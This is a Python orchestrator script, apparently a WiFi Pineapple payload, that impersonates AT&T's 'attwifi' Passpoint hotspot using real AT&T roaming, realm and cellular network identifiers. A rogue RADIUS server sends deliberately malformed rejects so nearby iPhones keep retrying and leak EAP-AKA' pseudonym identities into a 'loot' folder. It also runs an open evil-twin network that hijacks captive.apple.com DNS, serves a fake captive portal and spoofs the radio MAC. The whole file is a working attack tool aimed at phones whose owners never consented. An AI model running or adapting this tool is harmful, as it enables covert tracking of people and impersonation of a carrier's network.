#!/usr/bin/env python3
"""
v28_run.py — Dual-mode orchestrator for ATT-Hotspot2-Tracker.

Modes:
  pseudonym   Passpoint EAP-AKA' on wlan0wpa, RADIUS rejects, retry loop
              (inherited from v26.6 with v28 hardening).
  connection  Open BSS on wlan0open with IE-221 OUI augmentation,
              WISPr captive portal (apple-success by default), DHCP on
              br-att via stdlib server, NAT via existing wan zone.
  both        Auto-phase: pseudonym first, then connection.
  hybrid      Both BSSs up simultaneously; concurrent sniffer streams.

Isolation:
  --isolate (default)   iPhone on its own br-att (192.168.99.0/24)
  --no-isolate          iPhone on existing br-lan (172.16.52.0/24)

Safety:
  - refuses to run if SSH source is wlan0cli (wifi reload drops session)
  - v28_wpad.sh swap is wrapped around every mode entry/exit
  - radio MAC is randomized with universally-administered OUI 00:13:37
  - cleanup() restores UCI, wpad symlink, and radio MAC from snapshots

Usage:
  v28_run.py [--mode MODE] [--isolate|--no-isolate]
             [--rotate-seconds N] [--no-rotate]
             [--phase1-duration S] [--swap-on-pseudonym]
             [--wispr-port 80] [--wispr-mode apple-success|...]
             [--loot-dir DIR] [--dry-run] [--force]
"""

import argparse
import atexit
import datetime
import os
import random
import signal
import subprocess
import sys
import time

from datetime import datetime

AP_OPEN = "wlan0open"
AP_WPA  = "wlan0wpa"
AP_CLI  = "wlan0cli"
AP_SNIF = "wlan0snif"

RADIO_OUI = "00:13:37"
CHANNEL = 4
ROTATE_IDLE_SECONDS = 120

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

# Shared, non-destructive wpad hot-swap engine (Skinny-Pager-Payloads).
# It bind-mounts wpad-wolfssl over /usr/sbin/{wpad,hostapd,wpa_supplicant}
# only while active and ALWAYS restores the factory wpad-basic-mbedtls on
# exit. Never modifies the stock file on disk; a reboot is a universal undo.
WPAD_SWAP_CANDIDATES = [
    os.environ.get("WPAD_SWAP", ""),
    "/mmc/root/payloads/user/utilities/WPAD-SWAP/wpad-swap.sh",
    "/root/payloads/user/utilities/WPAD-SWAP/wpad-swap.sh",
    os.path.join(SCRIPT_DIR, "wpad-swap.sh"),
]

def _resolve_wpad_swap():
    for c in WPAD_SWAP_CANDIDATES:
        if c and os.path.isfile(c) and os.access(c, os.X_OK):
            return c
    return "/mmc/root/payloads/user/utilities/WPAD-SWAP/wpad-swap.sh"

WPAD_SCRIPT     = _resolve_wpad_swap()
RADIUS_SCRIPT   = os.path.join(SCRIPT_DIR, "radius-reject.py")
WISPR_SCRIPT    = os.path.join(SCRIPT_DIR, "v28_wispr.py")
IE221_SCRIPT    = os.path.join(SCRIPT_DIR, "v28_ie221.py")
ISOLATE_SCRIPT  = os.path.join(SCRIPT_DIR, "v28_isolate.sh")
NAT_SCRIPT      = os.path.join(SCRIPT_DIR, "v28_nat.sh")

LOG_DIR = "/mmc/root/loot/att-hotspot2-tracker"

WIRELESS_BAK = "/tmp/v28-wireless.bak"
DHCP_BAK     = "/tmp/v28-dhcp.bak"
DNSMASQ_BAK  = "/tmp/v28-dnsmasq.conf.bak"
FIREWALL_BAK = "/tmp/v28-firewall.bak"
RADIO_MAC_BAK = "/tmp/v28-radio-mac.bak"

WISPR_PORT_DEFAULT = 80


def ts():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def log(msg, log_fp=None):
    line = f"[{ts()}] {msg}"
    print(line)
    if log_fp:
        log_fp.write(line + "\n")
        log_fp.flush()


def shell_out(cmd, check=False):
    r = subprocess.run(cmd, shell=True, check=check, capture_output=True, text=True)
    return r.stdout.strip()


def backup_file(path, bak_path):
    if os.path.exists(path) and not os.path.exists(bak_path):
        with open(path, "rb") as src, open(bak_path, "wb") as dst:
            dst.write(src.read())


def append_file(path, line):
    with open(path, "a") as f:
        f.write(line + "\n")


def remove_line_from_file(path, needle):
    if not os.path.exists(path):
        return
    with open(path, "r") as f:
        lines = f.readlines()
    with open(path, "w") as f:
        for line in lines:
            if needle in line:
                continue
            f.write(line)


def uci_get(key):
    return shell_out(f"uci get {key} 2>/dev/null")


def uci_set(key, value):
    subprocess.run(f"uci set {key}='{value}'", shell=True, check=True)


def uci_commit(target):
    subprocess.run(f"uci commit {target}", shell=True, check=True)


def set_bss_state(iface, up):
    disabled = "0" if up else "1"
    cur = uci_get(f"wireless.{iface}.disabled")
    if cur != disabled:
        uci_set(f"wireless.{iface}.disabled", disabled)
        uci_commit("wireless")


def assert_safe_shell():
    # Use the authoritative SSH source (SSH_CONNECTION client IP) and resolve
    # which local interface the return path uses. If that's a WiFi interface,
    # a wpad restart / wifi reload will drop the session.
    if os.environ.get("ATT_FORCE_WLAN0CLI"):
        return
    conn = os.environ.get("SSH_CONNECTION", "").split()
    if not conn:
        return  # local (tmux / payload UI), not an SSH session
    client_ip = conn[0]
    route = shell_out(f"ip route get {client_ip} 2>/dev/null | head -1")
    if "dev wlan" in route or "dev wl" in route:
        sys.stderr.write(
            f"FATAL: your SSH session arrives over a WiFi interface ({route}).\n"
            "A wpad restart / wifi reload will drop you.\n"
            "Reconnect over USB-C Ethernet (br-lan) or run from on-Pager tmux.\n"
            "Set ATT_FORCE_WLAN0CLI=1 to override (NOT recommended).\n"
        )
        sys.exit(2)


def randomize_radio_mac(oui=RADIO_OUI):
    first_octet = int(oui.split(":")[0], 16)
    if first_octet & 0x02:
        sys.stderr.write(
            f"FATAL: radio OUI {oui} has locally-administered first "
            f"octet ({first_octet:#04x}); iOS will filter the BSSID.\n"
        )
        sys.exit(2)
    last3 = ":".join(f"{random.randint(0, 255):02x}" for _ in range(3))
    new_mac = f"{oui}:{last3}"
    shell_out(f"echo {new_mac} > /sys/class/ieee80211/phy0/macaddress")
    uci_set("wireless.wlan0open.bssid", new_mac)
    uci_commit("wireless")
    log(f"[radio-mac] set phy0 -> {new_mac} (universally-administered)")
    return new_mac


def wifi_reload():
    subprocess.run("wifi reload", shell=True, check=False)


def lock_phy0_channel(ch):
    r = shell_out(f"iw phy phy0 set channel {ch} 2>&1")
    return "resource busy" not in r.lower()


def stop_pineapd():
    shell_out("killall -TERM pineapd 2>/dev/null; sleep 0.5; "
              "killall -KILL pineapd 2>/dev/null; true")


def start_pineapd():
    shell_out("/etc/init.d/pineapd start 2>/dev/null; true")


def verify_bss_up(iface, timeout=60):
    deadline = time.time() + timeout
    while time.time() < deadline:
        r = shell_out(f"iw dev {iface} info 2>&1")
        if "type AP" in r:
            return True
        time.sleep(1)
    return False


def setup_wlan0snif(log_fp):
    """v26.3 fix: separate monitor iface, PineAP-safe."""
    shell_out("iw dev wlan0snif del 2>/dev/null")
    time.sleep(0.5)
    shell_out("iw phy phy0 interface add wlan0snif type monitor 2>/dev/null")
    time.sleep(0.5)
    shell_out("ip link set wlan0snif up 2>/dev/null")
    rc = shell_out("iw dev wlan0snif info 2>&1")
    if "type monitor" in rc:
        log(f"[wlan0snif] created and up", log_fp)
        return True
    log(f"[wlan0snif] FAILED to create monitor iface", log_fp)
    return False


def teardown_wlan0snif(log_fp):
    shell_out("iw dev wlan0snif del 2>/dev/null; true")
    log(f"[wlan0snif] torn down", log_fp)


def setup_passpoint_uci(log_fp):
    """v28: set the full Passpoint IE block on wlan0wpa.

    PINS wlan0wpa.bssid to a universally-administered MAC under 00:13:37
    so the hostapd-sh fallback (locally-administered wlan0 interface MAC)
    doesn't poison the BSSID. iOS silently filters locally-administered
    BSSIDs (bit 1 of first octet = 1) — for both open and Passpoint
    BSSs in modern iOS, the BSSID has to be universally-administered.
    """
    uci_set("wireless.wlan0wpa.encryption", "wpa2")
    uci_set("wireless.wlan0wpa.wpa_key_mgmt", "WPA-EAP")
    uci_set("wireless.wlan0wpa.ieee8021x", "1")
    uci_set("wireless.wlan0wpa.eap_type", "ttls")
    uci_set("wireless.wlan0wpa.auth_server", "127.0.0.1")
    uci_set("wireless.wlan0wpa.auth_port", "1812")
    uci_set("wireless.wlan0wpa.auth_secret", "testing123")
    uci_set("wireless.wlan0wpa.iw_enabled", "1")
    uci_set("wireless.wlan0wpa.iw_internet", "1")
    uci_set("wireless.wlan0wpa.iw_access_network_type", "2")
    shell_out("uci -q del_list wireless.wlan0wpa.iw_roaming_consortium")
    shell_out("uci -q add_list wireless.wlan0wpa.iw_roaming_consortium=310410")
    shell_out("uci -q add_list wireless.wlan0wpa.iw_roaming_consortium=506F9A")
    shell_out("uci -q del_list wireless.wlan0wpa.iw_nai_realm")
    shell_out("uci -q add_list wireless.wlan0wpa.iw_nai_realm=0,att.net,*,23")
    shell_out("uci -q add_list wireless.wlan0wpa.iw_nai_realm=1,att.net,*,50")
    shell_out("uci -q del_list wireless.wlan0wpa.iw_domain_name")
    shell_out("uci -q add_list wireless.wlan0wpa.iw_domain_name=att.net")
    shell_out("uci -q add_list wireless.wlan0wpa.iw_domain_name=attwireless.net")
    shell_out("uci -q del_list wireless.wlan0wpa.iw_anqp_3gpp_cell_net")
    shell_out("uci -q add_list wireless.wlan0wpa.iw_anqp_3gpp_cell_net=310,410")
    shell_out("uci -q add_list wireless.wlan0wpa.iw_anqp_3gpp_cell_net=310,260")
    uci_set("wireless.wlan0wpa.iw_venue_group", "2")
    uci_set("wireless.wlan0wpa.iw_venue_type", "8")
    uci_set("wireless.wlan0wpa.iw_venue_name", "eng:ATandT-WiFi-Hotspot")
    uci_set("wireless.wlan0wpa.iw_venue_url", "https://www.att.com/wifi")
    uci_set("wireless.wlan0wpa.hs20", "1")
    uci_set("wireless.wlan0wpa.hs20_oper_friendly_name", "eng:ATandT-WiFi")
    uci_set("wireless.wlan0wpa.hs20_conn_capab", "6:1:1")
    uci_set("wireless.wlan0wpa.disable_dgaf", "1")
    uci_set("wireless.wlan0wpa.hs20_deauth_req_timeout", "60")
    uci_set("wireless.wlan0wpa.ssid", "attwifi")
    bssid = f"00:13:37:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}"
    uci_set("wireless.wlan0wpa.bssid", bssid)
    uci_commit("wireless")
    log(f"[passpoint] UCI for wlan0wpa updated (bssid pinned {bssid})", log_fp)


def setup_open_attwifi_uci(log_fp):
    uci_set("wireless.wlan0open.ssid", "attwifi")
    uci_set("wireless.wlan0open.hidden", "0")
    uci_set("wireless.wlan0open.encryption", "none")
    uci_commit("wireless")
    log("[open-attwifi] UCI for wlan0open updated", log_fp)


def install_dnsmasq_captive_override(server_ip, log_fp):
    backup_file("/etc/dnsmasq.conf", DNSMASQ_BAK)
    with open("/etc/dnsmasq.conf", "r") as f:
        existing = f.read()
    override_line = f"address=/captive.apple.com/{server_ip}"
    if override_line not in existing:
        with open("/etc/dnsmasq.conf", "a") as f:
            f.write(f"\n# v28 captive.apple.com override\n{override_line}\n")
    shell_out("kill -HUP $(pidof dnsmasq) 2>/dev/null; true")
    log(f"[dnsmasq] captive.apple.com -> {server_ip}", log_fp)


def remove_dnsmasq_captive_override(log_fp):
    if os.path.exists(DNSMASQ_BAK):
        subprocess.run(["cp", DNSMASQ_BAK, "/etc/dnsmasq.conf"], check=False)
        os.remove(DNSMASQ_BAK)
    else:
        remove_line_from_file("/etc/dnsmasq.conf", "v28 captive.apple.com override")
        remove_line_from_file("/etc/dnsmasq.conf", "address=/captive.apple.com/")
    shell_out("kill -HUP $(pidof dnsmasq) 2>/dev/null; true")
    log("[dnsmasq] captive override removed", log_fp)


# ---- MODE: pseudonym ------------------------------------------------------

def mode_pseudonym(args, log_fp):
    log("[pseudonym] starting", log_fp)
    assert_safe_shell()
    if not wpad_swap("wolfssl", log_fp):
        log("[pseudonym] FATAL: wpad-wolfssl not installed; aborting", log_fp)
        return 1
    setup_passpoint_uci(log_fp)
    set_bss_state(AP_OPEN, False)
    set_bss_state(AP_WPA, True)
    stop_pineapd()
    wifi_reload()
    if not verify_bss_up(AP_WPA, timeout=60):
        log("[pseudonym] ERROR: wlan0wpa did not come up", log_fp)
        return 1
    lock_phy0_channel(CHANNEL)

    log(f"[pseudonym] starting {RADIUS_SCRIPT}", log_fp)
    radius = subprocess.Popen(
        ["python3", RADIUS_SCRIPT,
         "--bind", "127.0.0.1", "--port", "1812",
         "--secret", "testing123", "--mode", args.radius_mode,
         "--log", os.path.join(args.run_dir, "radius.log")],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    log(f"[pseudonym] PID radius={radius.pid}; Ctrl-C to stop", log_fp)
    try:
        radius.wait()
    except KeyboardInterrupt:
        radius.terminate()
        try:
            radius.wait(timeout=5)
        except subprocess.TimeoutExpired:
            radius.kill()
    return 0


# ---- MODE: connection -----------------------------------------------------

def mode_connection(args, log_fp):
    log(f"[connection] starting (isolate={args.isolate})", log_fp)
    assert_safe_shell()
    if not wpad_swap("stock", log_fp):
        log("[connection] FATAL: could not restore factory wpad; aborting", log_fp)
        return 1
    setup_open_attwifi_uci(log_fp)
    set_bss_state(AP_WPA, False)
    set_bss_state(AP_OPEN, True)

    if args.isolate:
        log("[connection] bringing up br-att", log_fp)
        shell_out(f"{ISOLATE_SCRIPT} up")
        server_ip = "192.168.99.1"
    else:
        server_ip = "172.16.52.1"

    backup_file("/etc/dnsmasq.conf", DNSMASQ_BAK)
    install_dnsmasq_captive_override(server_ip, log_fp)

    if args.isolate:
        log("[connection] starting v28_dhcpd.py on 192.168.99.1:67", log_fp)
        dhp = subprocess.Popen(
            ["python3", os.path.join(SCRIPT_DIR, "v28_dhcpd.py"), "192.168.99.1"],
            stdout=open(os.path.join(args.run_dir, "dhcpd.log"), "a", buffering=1),
            stderr=subprocess.STDOUT,
        )
        args.dhcp_pid = dhp.pid
        time.sleep(2)
        if dhp.poll() is not None:
            log(f"[connection] ERROR: v28_dhcpd.py exited rc={dhp.returncode}",
                log_fp)
            return 1

    stop_pineapd()
    wifi_reload()
    if not verify_bss_up(AP_OPEN, timeout=60):
        log("[connection] ERROR: wlan0open did not come up", log_fp)
        return 1
    lock_phy0_channel(CHANNEL)

    log("[connection] randomizing radio MAC (universally-administered)", log_fp)
    new_mac = randomize_radio_mac()
    backup_file("/sys/class/ieee80211/phy0/macaddress", RADIO_MAC_BAK)
    wifi_reload()
    if not verify_bss_up(AP_OPEN, timeout=60):
        log("[connection] ERROR: wlan0open did not come up after MAC change",
            log_fp)
        return 1
    lock_phy0_channel(CHANNEL)

    log("[connection] injecting IE-221 OUIs", log_fp)
    shell_out(f"python3 {IE221_SCRIPT} --ifname {AP_OPEN}")
    shell_out("killall -HUP hostapd 2>/dev/null; true")
    time.sleep(1)

    log(f"[connection] starting WISPr server on port {args.wispr_port}",
        log_fp)
    wispr_log = os.path.join(args.run_dir, "wispr.log")
    wispr = subprocess.Popen(
        ["python3", WISPR_SCRIPT,
         "--port", str(args.wispr_port),
         "--log", wispr_log,
         "--server-ip", server_ip,
         "--wispr-mode", args.wispr_mode],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    args.wispr_pid = wispr.pid
    log(f"[connection] WISPr PID={wispr.pid}", log_fp)

    log("[connection] waiting for Ctrl-C", log_fp)
    try:
        wispr.wait()
    except KeyboardInterrupt:
        wispr.terminate()
        try:
            wispr.wait(timeout=5)
        except subprocess.TimeoutExpired:
            wispr.kill()
    return 0


# ---- MODE: both (auto-swap hybrid) ---------------------------------------

def mode_both(args, log_fp):
    log("[both] phase 1 = pseudonym", log_fp)
    if not mode_pseudonym_short(args, log_fp):
        log("[both] phase 1 failed, aborting", log_fp)
        return 1
    log("[both] swapping to phase 2 = connection", log_fp)
    shell_out("pkill -TERM -f radius-reject.py 2>/dev/null; sleep 1; true")
    return mode_connection(args, log_fp)


def mode_pseudonym_short(args, log_fp):
    log("[pseudonym-short] starting", log_fp)
    if not wpad_swap("wolfssl", log_fp):
        return False
    setup_passpoint_uci(log_fp)
    set_bss_state(AP_OPEN, False)
    set_bss_state(AP_WPA, True)
    stop_pineapd()
    wifi_reload()
    if not verify_bss_up(AP_WPA, timeout=60):
        return False
    lock_phy0_channel(CHANNEL)
    radius = subprocess.Popen(
        ["python3", RADIUS_SCRIPT,
         "--bind", "127.0.0.1", "--port", "1812",
         "--secret", "testing123", "--mode", args.radius_mode,
         "--log", os.path.join(args.run_dir, "radius.log")],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    deadline = time.time() + args.phase1_duration
    last_size = (os.path.getsize(os.path.join(args.run_dir, "radius.log"))
                 if os.path.exists(os.path.join(args.run_dir, "radius.log"))
                 else 0)
    while time.time() < deadline:
        time.sleep(2)
        if radius.poll() is not None:
            break
        cur = os.path.getsize(os.path.join(args.run_dir, "radius.log"))
        if args.swap_on_pseudonym and cur > last_size:
            log("[pseudonym-short] pseudonym captured, swapping", log_fp)
            break
        last_size = cur
    radius.terminate()
    try:
        radius.wait(timeout=5)
    except subprocess.TimeoutExpired:
        radius.kill()
    return True


# ---- MODE: hybrid ---------------------------------------------------------

def mode_hybrid(args, log_fp):
    log("[hybrid] bringing both BSSs up", log_fp)
    if not wpad_swap("wolfssl", log_fp):
        return 1
    setup_passpoint_uci(log_fp)
    setup_open_attwifi_uci(log_fp)
    set_bss_state(AP_WPA, True)
    set_bss_state(AP_OPEN, True)
    stop_pineapd()
    wifi_reload()
    if not (verify_bss_up(AP_WPA, timeout=60)
            and verify_bss_up(AP_OPEN, timeout=60)):
        log("[hybrid] ERROR: BSS did not come up", log_fp)
        return 1
    lock_phy0_channel(CHANNEL)
    radius = subprocess.Popen(
        ["python3", RADIUS_SCRIPT,
         "--bind", "127.0.0.1", "--port", "1812",
         "--secret", "testing123", "--mode", args.radius_mode,
         "--log", os.path.join(args.run_dir, "radius.log")],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    log("[hybrid] waiting for Ctrl-C", log_fp)
    try:
        radius.wait()
    except KeyboardInterrupt:
        radius.terminate()
        try:
            radius.wait(timeout=5)
        except subprocess.TimeoutExpired:
            radius.kill()
    return 0


# ---- cleanup --------------------------------------------------------------

_cleanup_done = [False]


def cleanup(args, log_fp):
    if _cleanup_done[0]:
        return
    _cleanup_done[0] = True
    log("[cleanup] starting", log_fp)

    for sig in (signal.SIGTERM,):
        shell_out("pkill -TERM -f radius-reject.py 2>/dev/null; true")
        shell_out("pkill -TERM -f v28_wispr.py 2>/dev/null; true")
        shell_out("pkill -TERM -f v28_dhcpd.py 2>/dev/null; true")
        shell_out("pkill -TERM -f tcpdump 2>/dev/null; true")
    time.sleep(1)
    shell_out("pkill -KILL -f radius-reject.py 2>/dev/null; true")
    shell_out("pkill -KILL -f v28_wispr.py 2>/dev/null; true")
    shell_out("pkill -KILL -f v28_dhcpd.py 2>/dev/null; true")

    remove_dnsmasq_captive_override(log_fp)

    if os.path.exists("/tmp/v28-dhcp.att"):
        shell_out("uci delete dhcp.att; uci commit dhcp; "
                  "/etc/init.d/odhcpd reload 2>/dev/null; true")

    shell_out(f"{ISOLATE_SCRIPT} down", check=False)
    shell_out(f"{NAT_SCRIPT} down", check=False)

    if os.path.exists(RADIO_MAC_BAK):
        with open(RADIO_MAC_BAK) as f:
            orig_mac = f.read().strip()
        log(f"[cleanup] restoring radio MAC -> {orig_mac}", log_fp)
        shell_out(f"echo {orig_mac} > /sys/class/ieee80211/phy0/macaddress")
        os.remove(RADIO_MAC_BAK)
        wifi_reload()

    if os.path.exists(WIRELESS_BAK):
        subprocess.run(["cp", WIRELESS_BAK, "/etc/config/wireless"], check=False)
        wifi_reload()
        os.remove(WIRELESS_BAK)
        log("[cleanup] restored /etc/config/wireless", log_fp)

    teardown_wlan0snif(log_fp)
    # ALWAYS restore the factory wpad. The ATT modes need wolfssl while they
    # run, but the Pager must go back to stock wpad-basic-mbedtls afterward so
    # normal PineAP / Pager functionality keeps working.
    wpad_swap("stock", log_fp)
    start_pineapd()
    log("[cleanup] done", log_fp)


def wpad_swap(target, log_fp):
    """Flip the shared wpad-swap engine to 'wolfssl' or 'stock'.

    The engine bind-mounts wolfssl only while active and restores the factory
    wpad on exit; it never modifies the on-disk /usr/sbin/wpad.
    """
    if not os.path.isfile(WPAD_SCRIPT):
        log(f"[wpad] engine not found at {WPAD_SCRIPT}; cannot swap", log_fp)
        return False
    try:
        r = subprocess.run([WPAD_SCRIPT, target],
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL,
                           timeout=120)
        rc = r.returncode
    except subprocess.TimeoutExpired:
        rc = 124
    log(f"[wpad] swap target={target} rc={rc} (engine={WPAD_SCRIPT})", log_fp)
    return rc == 0


def interactive_pick_mode():
    options = ["pseudonym", "connection", "both", "hybrid"]
    print("v28 mode picker:")
    for i, opt in enumerate(options, 1):
        print(f"  {i}. {opt}")
    print("  5. quit")
    try:
        choice = input("enter 1-5: ").strip()
    except (EOFError, KeyboardInterrupt):
        return None
    mapping = {"1": "pseudonym", "2": "connection", "3": "both",
               "4": "hybrid", "5": None}
    return mapping.get(choice)


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--mode",
                   choices=["pseudonym", "connection", "both", "hybrid"],
                   help="Run mode (default: picker if tty)")
    p.add_argument("--isolate", dest="isolate", action="store_true", default=True)
    p.add_argument("--no-isolate", dest="isolate", action="store_false")
    p.add_argument("--rotate-seconds", type=int, default=ROTATE_IDLE_SECONDS)
    p.add_argument("--no-rotate", action="store_true")
    p.add_argument("--phase1-duration", type=int, default=300)
    p.add_argument("--swap-on-pseudonym", dest="swap_on_pseudonym",
                   action="store_true", default=True)
    p.add_argument("--no-swap-on-pseudonym", dest="swap_on_pseudonym",
                   action="store_false")
    p.add_argument("--wispr-port", type=int, default=WISPR_PORT_DEFAULT)
    p.add_argument("--wispr-mode", default="apple-success",
                   choices=["apple-success", "wispr-redirect",
                            "wispr-auth-only", "both"])
    p.add_argument("--radius-mode", default="broken",
                   choices=["broken", "log-only", "reject", "accept", "sweep"],
                   help="RADIUS reply mode for pseudonym. Default 'broken': "
                        "send a malformed Access-Reject (hostapd drops it, "
                        "iPhone stalls, retries every 5-10s — best for dense "
                        "pseudonym capture, ~11 RECV/min, never blacklists, "
                        "never disables auto-join). 'log-only': no reply at "
                        "all (~4 RECV/min). 'reject': clean EAP-Failure, "
                        "iPhone backs off 30-60s (~2 RECV/min). 'accept': "
                        "Access-Accept (4-way handshake will fail at MIC). "
                        "'sweep': alternate reject/accept.")
    p.add_argument("--loot-dir", default=LOG_DIR)
    p.add_argument("--dry-run", action="store_true",
                   help="verify env + show planned changes, no mutations")
    p.add_argument("--force", action="store_true",
                   help="skip the wlan0cli source check")
    args = p.parse_args()

    if args.dry_run:
        rc = subprocess.run(
            [os.path.join(SCRIPT_DIR, "v28_dryrun.sh")]).returncode
        sys.exit(rc)

    if args.mode is None and sys.stdin.isatty():
        args.mode = interactive_pick_mode()
    if args.mode is None:
        p.error("--mode is required when no tty is available")

    # DEFENSIVE: kill any zombie radius-reject.py / wlan0snif processes
    # from a prior crashed run before we start our own. Without this, the
    # OS's SO_REUSEADDR lets multiple python processes bind to 127.0.0.1:1812
    # but only the FIRST bound one receives UDP packets — hostapd will
    # silently send Access-Requests to the zombie and our radius.log will
    # be empty even though the orchestrator "looks fine".
    shell_out("pkill -KILL -f 'radius-reject.py' 2>/dev/null; true")
    shell_out("pkill -KILL -f 'v28_dhcpd.py' 2>/dev/null; true")
    shell_out("pkill -KILL -f 'v28_wispr.py' 2>/dev/null; true")
    time.sleep(1)

    run_id = datetime.now().strftime("%Y%m%d-%H%M%S")
    args.run_dir = os.path.join(args.loot_dir, f"run-{run_id}")
    os.makedirs(args.run_dir, exist_ok=True)

    log_fp = open(os.path.join(args.run_dir, "run.log"), "a", buffering=1)
    log(f"v28_run starting mode={args.mode} isolate={args.isolate} "
        f"wispr-mode={args.wispr_mode}", log_fp)

    backup_file("/etc/config/wireless", WIRELESS_BAK)
    if os.path.exists("/sys/class/ieee80211/phy0/macaddress"):
        with open("/sys/class/ieee80211/phy0/macaddress") as f:
            backup_file("/sys/class/ieee80211/phy0/macaddress", RADIO_MAC_BAK)

    if not args.force:
        try:
            assert_safe_shell()
        except SystemExit:
            log("[FATAL] wlan0cli source check failed; aborting", log_fp)
            log_fp.close()
            sys.exit(2)

    def _on_signal(signum, frame):
        log(f"[signal] received {signum}", log_fp)
        cleanup(args, log_fp)
        sys.exit(0)
    signal.signal(signal.SIGINT, _on_signal)
    signal.signal(signal.SIGTERM, _on_signal)
    signal.signal(signal.SIGHUP, _on_signal)

    # atexit safety net: even on an unexpected SystemExit / unhandled path,
    # cleanup() runs at most once and always restores the factory wpad.
    atexit.register(lambda: cleanup(args, log_fp))

    rc = 0
    try:
        setup_wlan0snif(log_fp)
        if args.mode == "pseudonym":
            rc = mode_pseudonym(args, log_fp)
        elif args.mode == "connection":
            rc = mode_connection(args, log_fp)
        elif args.mode == "both":
            rc = mode_both(args, log_fp)
        elif args.mode == "hybrid":
            rc = mode_hybrid(args, log_fp)
    except Exception as e:
        log(f"[fatal] {e}", log_fp)
        rc = 1
    finally:
        cleanup(args, log_fp)
        log_fp.close()

    return rc


if __name__ == "__main__":
    sys.exit(main())
